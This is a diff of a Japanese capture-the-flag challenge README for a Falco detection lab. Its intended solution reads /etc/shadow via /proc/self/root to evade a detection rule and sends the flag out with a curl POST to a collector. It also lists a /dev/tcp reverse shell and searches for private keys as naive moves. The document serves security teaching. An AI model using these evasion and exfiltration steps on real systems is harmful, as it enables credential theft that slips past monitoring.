@@ -1,41 +1,64 @@
 # 10 — The Final Exfil (Boss)
 
-集大成。**6 つの禁止ルールを 30 秒の window 内で 1 つも発火させずに**
-flag を取り出して提出する。
+集大成。master key を **発火させずに読み**、**箱の外の collector へ静かに
+持ち出し (exfil)**、**submit** する。3 つすべてを満たして solve。単に読んで
+submit するだけでは通らない(`requireExfil`)。
 
-## Forbidden rules (6)
+## 採点条件 (3 つすべて)
 
-- Read sensitive file untrusted
-- Search Private Keys or Passwords
-- Run shell untrusted
-- Modify binary dirs
-- Write below binary dir
-- Launch Suspicious Network Tool in Container
+1. `submit` の flag が `expectedFlag` と一致
+2. 直前 `windowSeconds`(30s)に `forbiddenRules`(7 つ)が 1 つも発火していない
+3. その user が collector に正しい flag を exfil 済み
+   (`POST /api/challenges/10-final-exfil/exfil`、`requireExfil: true`)
+
+## なぜ 4-9 の知識が要るか(設計意図)
+
+旧版は「sensitive file を読む」だけで完結し、`/proc/self/root`(Mission 03)
+一発で解けた。本版は **exfil(持ち出し)を必須アクション**にすることで、
+trigger 系ミッションの知識を「やってはいけないこと」として要求する:
+
+| 必須アクション | 素朴なやり方(発火) | 回避(学んだ知識) |
+|---|---|---|
+| flag を読む | `cat /etc/shadow` → Read-sensitive | `/proc/self/root`(**03**) |
+| 箱の外へ送る | `bash -i >& /dev/tcp/...` → C2(**08**) | curl で HTTP POST |
+| 送信ツール用意 | 自前 exfil バイナリを drop+実行 → Drop+exec(**07**) | 既存の curl を使う |
+| 鍵を漁る/退避 | `find -name id_rsa`/`grep 'PRIVATE KEY'`/`ln` → Search(**04/05**)/Hardlink(**09**) | やらない |
+
+collector は **HTTP のみ受信**するので、reverse shell では物理的に届かない。
+= 静かな HTTP 持ち出し(curl)が唯一の現実解。
 
 ## Flag
 
-postStart (`plant.sh`) で `/etc/shadow` 末尾の特別行
-(`# NIMBUS_FINAL: FALCO{...}`) として書き込まれる。実値はイベント毎に注入
-(`CTF_FLAG_10_FINAL_EXFIL`)。ローカルは dev default。
+postStart (`plant.sh`) が `/etc/shadow` 末尾に `# CTF_MASTER_KEY: FALCO{...}`
+を追記。実値はイベント毎に注入 (`CTF_FLAG_10_FINAL_EXFIL`)、ローカルは
+dev default `FALCO{dev-final-exfil}`。
 
 ## 想定解
 
 ```bash
-# 1. flag を /proc/self/root 経由で読む (Mission 03 のテクニック)
-#    cat /etc/shadow は read sensitive file untrusted 発火 → 不可
-cat /proc/self/root/etc/shadow | grep NIMBUS_FINAL
+# 1) 発火させずに読む (Mission 03)
+FLAG=$(grep CTF_MASTER_KEY /proc/self/root/etc/shadow | awk '{print $NF}')
 
-# 2. 提出
-source /opt/ctf/fixtures/submit.sh
-submit 'FALCO{...}'
+# 2) 既存 curl で collector へ静かに HTTP exfil
+curl -s "${FALCO_CTF_SCOREBOARD}/api/challenges/10-final-exfil/exfil" \
+  -H 'Content-Type: application/json' \
+  -d "{\"user\":\"${FALCO_CTF_USER}\",\"flag\":\"${FLAG}\"}"
+#  → {"received":true,...}
+
+# 3) 30 秒静かに待ってから提出
+source /opt/ctf/submit.sh
+submit 10-final-exfil "${FLAG}"
 ```
-
-**注意**: window=30s 中に他のチャレンジで発火させた古い rule fire が
-残っている可能性。参加者には「30 秒静かにしてから submit」を勧める。
 
 ## 解説
 
-- 全 forbidden rule に **学んだ回避テクニックを使えば抜けられる**
-- だが「全部を同時に意識する」のは想像以上に難しい
-- 講評のポイント: 「単一ルール回避は容易、複合制約は重い」 = 防御側は
-  ルールを増やすほど攻撃者の負担が指数的に上がる
+- **exfil を必須化したのが肝**: 「読むだけ」では 03 一本に collapse する
+  (`/proc/self/root` で全 sensitive file が読め、benign マーカーの grep は
+  どのルールも踏まない)。持ち出しという *必須アクション* を足すことで、
+  「派手な持ち出し = 発火」という 07/08 の教訓が初めて要求される。
+- collector が HTTP 受信専用なのは意図的: reverse shell では届かないので、
+  curl(既存バイナリ・dup を伴わない HTTP)に自然に誘導される。
+- window 検査は二重の安全網: もし reverse shell や drop+exec を試して
+  発火させると、その後 30 秒は submit が `evaded:false` で弾かれる。
+- 講評: 防御側は「検知点を増やす」だけでなく「攻撃者が必ず通る隘路
+  (= 持ち出し)」に検知を置くほど、攻撃コストが跳ね上がる。
